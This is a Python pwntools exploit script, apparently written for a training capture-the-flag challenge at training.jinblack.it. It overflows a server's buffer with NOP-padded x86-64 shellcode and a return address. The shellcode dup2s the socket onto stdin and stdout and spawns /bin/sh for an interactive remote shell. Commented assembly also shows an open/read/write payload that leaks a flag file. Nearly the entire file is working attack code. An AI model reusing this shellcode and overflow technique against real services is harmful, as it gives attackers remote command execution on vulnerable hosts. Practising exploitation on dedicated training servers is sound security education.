from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
context.terminal = ['gnome-terminal', '--geometry', '104x55-8+0' ,'-x']
context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2005
PROG = "./server"
LOCAL_PORT = 4000
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    set follow-fork-mode child
    b* 0x0040138c
    b* 0x401306
    b *0x401233
    b* 0x004040c0
    """)
    input("wait for gdb")
elif args.LOCAL:
    r = remote("localhost", LOCAL_PORT)
elif args.SSH:
    ssh = ssh("ubuntu","192.168.239.131", password="ubuntu")
    ssh.process(PROG)
else:
    r = process(PROG)

input("Start connection.....")


input("receving....")
dup2shellcode = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x66\xB8\x21\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05\x66\xB8\x21\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05"



shellcode = b"\x48\x31\xC0\x66\xB8\x3B\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05\x90"
shellcode = dup2shellcode + shellcode
# shellcode = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x48\xBB\x2E\x2F\x66\x6C\x61\x67\x00\x00\x53\x48\x89\xE7\x0F\x05\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC7\x05\x00\x00\x00\x48\xC7\xC6\xC0\x41\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\xC0\x41\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
# c.send(shellcode.ljust(1016,b"\x90") + p64(0x004040c0))
# c.interactive()


r.send(shellcode.rjust(1016,b"\x90") + p64(0x004040c0))
r.interactive()
############## open -> read -> write
#xor rax, rax
# xor rdi, rdi
# xor rsi, rsi
# xor rdx, rdx
# mov rax, 0x2
# mov rbx, 0x000067616c662f2e
# push rbx
# mov rdi, rsp
# syscall
#open("./flag\x00\x00")

# xor rax, rax
# xor rdi, rdi
# mov rdi, 0x5
# mov rsi, 0x004041c0
# mov rdx, 0x100
# syscall
# read(5, 0x4041c0,0x100)
# mov rax, 0x1
# mov rdi, 0x4
# mov rsi, 0x004041c0
# mov rdx, 0x100
# syscall
# write(4, 0x4041c0,0x100) on the socket file descriptor

############## dup2 shellcode
# xor rax, rax
# xor rdi, rdi
# xor rsi, rsi
# xor rdx, rdx
# mov ax, 0x21
# mov rdi, 0x4
# mov rsi, 0x1
# syscall dup2(4,1)
# mov ax, 0x21
# mov rsi, 0x0
# syscall dup2(4,0)

############## execve("/bin/sh\x00")
# xor rax, rax
# xor rdi, rdi
# xor rsi, rsi
# xor rdx, rdx
# mov ax, 0x3b
# mov rbx, 0x0068732f6e69622f
# push rbx
# mov rdi, rsp
# xor rbx, rbx
# push rbx
# mov rsi, rsp
# mov rdx, rsp
# syscall
